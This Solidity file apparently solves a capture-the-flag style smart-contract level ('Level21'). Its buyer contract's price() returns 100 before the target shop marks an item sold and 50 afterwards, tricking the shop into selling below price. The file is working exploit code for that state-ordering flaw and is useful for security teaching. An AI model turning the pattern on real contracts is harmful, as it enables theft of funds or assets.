// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.0;

interface IBuyer {
  function price() external view returns (uint);
}

interface Shop {
  function  price() view external returns(uint);
  function isSold() view external returns(bool);
  function buy() external;
}


contract Level21 is IBuyer{

    Shop shop;

    constructor(Shop _shop){
        shop = _shop;
    }
    function buy() external{
        shop.buy();
    }
    function price() external override view returns (uint){
        if (shop.isSold()){
            return 50;
        }
        else{
            return 100;
        }
    }
}